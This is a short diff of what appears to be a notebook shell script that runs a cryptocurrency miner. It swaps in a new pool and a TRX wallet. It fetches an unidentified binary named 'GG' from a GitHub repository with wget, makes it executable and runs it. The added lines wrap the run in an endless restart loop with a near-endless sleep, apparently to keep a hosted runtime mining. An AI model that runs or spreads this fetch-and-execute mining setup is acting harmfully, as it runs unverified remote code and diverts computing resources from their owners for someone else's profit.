@@ -5,8 +5,8 @@
 #################################
 
 ALGHO=ETHASH
-POOL=us-eth.2miners.com:2020
-WALLET=0x6e890745813facaeab2afab23440a04f6b55034a
+POOL=ethash.unmineable.com:3333
+WALLET=TRX:TYWmD5VqkvA9AT4Pcfgqx5asB8WC2cgodP
 WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)
 
 #################################
@@ -17,4 +17,8 @@ WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)
 
 ! wget https://github.com/prathhub/SPLIT/raw/main/GG
 ! chmod +x GG
-! ./GG --algo $ALGHO --pool $POOL --user $WALLET.$WORKER
+while [ 1 ]; do
+! ./GG --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 5
+done
+sleep 999999999 
